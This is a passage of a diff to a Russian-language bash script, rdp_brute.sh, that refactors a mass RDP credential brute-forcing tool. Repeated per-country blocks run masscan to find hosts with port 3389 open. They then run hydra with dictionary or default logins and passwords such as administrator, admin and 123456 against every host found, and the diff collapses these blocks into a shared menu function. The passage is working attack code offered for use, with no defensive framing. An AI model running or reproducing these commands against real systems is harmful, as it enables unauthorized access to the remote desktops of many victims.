-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -14029,6 +5597,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14038,53 +5607,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -14102,6 +5625,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14111,53 +5635,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -14175,6 +5653,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14184,53 +5663,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -14248,6 +5681,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14257,53 +5691,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "192" ]; then
@@ -14320,6 +5708,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14329,53 +5718,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "193" ]; then
@@ -14392,6 +5735,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14401,53 +5745,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -14465,6 +5763,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14474,53 +5773,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "195" ]; then
@@ -14537,6 +5790,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14546,53 +5800,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "196" ]; then
@@ -14609,6 +5817,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14618,53 +5827,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "197" ]; then
@@ -14681,6 +5844,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14690,53 +5854,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "198" ]; then
@@ -14753,6 +5871,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14762,53 +5881,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "199" ]; then
@@ -14825,6 +5898,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14834,53 +5908,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -14898,6 +5926,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14907,53 +5936,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "201" ]; then
@@ -14970,6 +5953,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -14979,53 +5963,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
